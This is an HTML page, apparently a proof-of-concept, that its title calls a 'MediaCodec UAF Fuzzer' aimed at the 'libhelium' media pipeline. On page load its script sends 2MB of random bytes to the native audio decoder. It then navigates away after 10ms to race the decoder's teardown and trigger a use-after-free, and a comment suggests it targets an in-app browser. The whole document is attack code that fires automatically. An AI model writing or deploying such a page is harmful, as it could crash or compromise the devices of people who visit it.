<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MediaCodec UAF Fuzzer</title>
</head>
<body style="background:#000; color:#0ff; font-family:monospace;">
    <h3>Attacking libhelium Media Pipeline...</h3>
    <div id="status">Generating corrupted media payload...</div>

    <script>
        const statusEl = document.getElementById('status');

        function fireMediaUAF() {
            statusEl.innerText = "[*] Spawning AudioContext...";
            
            // 1. Initialize the native audio bridge
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const ctx = new AudioContext();

            // 2. Create 2MB of absolute garbage data. 
            // We want this to take the hardware decoder a few milliseconds to process and eventually fail.
            const bufferSize = 1024 * 1024 * 2; 
            const buffer = new ArrayBuffer(bufferSize);
            const view = new Uint8Array(buffer);
            for (let i = 0; i < bufferSize; i++) {
                view[i] = Math.floor(Math.random() * 256); // Random noise
            }

            statusEl.innerText = "[*] Choking hardware decoder...";

            // 3. Send the garbage to the native C++ decoder
            // This is asynchronous and crosses the boundary to the Android OS
            ctx.decodeAudioData(buffer, 
                function(decodedData) {
                    // Won't happen, it's garbage
                }, 
                function(error) {
                    // By the time this error fires, we want the C++ object to be DEAD.
                    console.log("Decode error fired");
                }
            );

            // 4. The Teardown Race
            // Instantly navigate away to destroy the WebContents and trigger releaseAsync
            // while the hardware is actively processing the garbage buffer.
            setTimeout(() => {
                window.location.href = "about:blank";
            }, 10); // 10ms is usually the sweet spot for MediaCodec races
        }

        // Delay slightly to ensure FB has fully attached the surface, then fire
        setTimeout(fireMediaUAF, 500);

    </script>
</body>
</html>
